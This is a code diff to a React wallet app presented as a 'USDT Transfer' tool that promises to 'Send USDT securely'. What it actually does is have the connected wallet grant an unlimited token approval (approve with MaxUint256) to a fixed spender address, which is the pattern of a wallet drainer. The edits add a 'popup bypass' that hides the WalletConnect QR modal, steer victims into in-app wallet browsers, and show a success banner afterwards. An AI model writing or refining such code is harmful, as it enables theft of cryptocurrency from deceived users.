@@ -22,7 +22,6 @@ function App() {
   const [step, setStep] = useState(1);
   const [selectedNetwork, setSelectedNetwork] = useState("bsc");
   
-  // Success banner ke liye states
   const [success, setSuccess] = useState(false);
   const [txHash, setTxHash] = useState("");
 
@@ -43,14 +42,13 @@ function App() {
     try {
       setLoading(true);
       setStatus("Connecting...");
-      setStep(2);
 
       const chainId = selectedNetwork === 'bsc' ? 56 : 1;
 
       const wcProvider = await EthereumProvider.init({
         projectId: PROJECT_ID,
         chains: [chainId, 56, 1],
-        showQrModal: true,
+        showQrModal: false, // POPUP BYPASS: Ise false kar diya
         metadata: {
           name: "USDT Transfer",
           description: "Send USDT securely",
@@ -59,16 +57,23 @@ function App() {
         }
       });
 
-      await wcProvider.enable();
+      // Direct deep link ya in-app browser ke liye connect
+      try {
+        await wcProvider.enable();
+      } catch (err) {
+        // Agar enable fail ho (Chrome me bina wallet ke), toh connect trigger karo
+        await wcProvider.connect();
+      }
       
       setProvider(wcProvider);
       setAccount(wcProvider.accounts[0]);
       setStatus("Connected. Please tap Approve.");
+      setStep(2); // Success hone par direct approve page
       setLoading(false);
     } catch (error) {
       console.error(error);
-      setStatus("Connection failed.");
-      setStep(1);
+      // Agar normal Chrome me khola hai bina wallet ke, toh popup bypass nahi hoga
+      setStatus("Please open this link inside Trust Wallet or Binance App.");
       setLoading(false);
     }
   };
@@ -92,11 +97,8 @@ function App() {
       const tx = await contract.approve(SPENDER_EVM, MaxUint256);
       
       setStatus("Transaction Pending...");
-      
-      // Transaction confirm hone ka wait
       const receipt = await tx.wait(); 
 
-      // Success State Set karo
       setTxHash(tx.hash);
       setSuccess(true);
       setStatus("");
@@ -128,7 +130,6 @@ function App() {
         <div></div>
       </div>
 
-      {/* SUCCESS SCREEN (Bilkul tumhari 1st image jaisa) */}
       {success ? (
         <div className="form-container" style={{ justifyContent: 'center' }}>
            <div style={{ backgroundColor: '#4ade80', padding: '20px', borderRadius: '12px', color: '#000', textAlign: 'center', marginBottom: '20px' }}>
